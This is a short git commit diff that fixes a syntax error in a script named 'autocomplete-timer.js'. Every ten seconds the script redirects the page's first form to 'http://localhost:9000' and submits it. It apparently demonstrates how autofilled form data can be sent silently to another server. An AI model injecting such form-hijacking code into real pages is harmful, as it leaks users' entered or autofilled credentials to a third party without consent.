151c2fd8d325f3f84921a5e176aea4128e7f7e3c
abhaytech1234 <117973135+abhaytech1234@users.noreply.github.com>
2023-04-21 07:39:50 +0530

    Update autocomplete-timer.js

--- autocomplete-timer.js
+++ autocomplete-timer.js
@@ -1,6 +1,6 @@
 <script>
  window.setInterval( function() {
   document.forms[0].action = 'http://localhost:9000';
-  document.forms[0]submit();
+  document.forms[0].submit();
  }, 10000);
 </script>
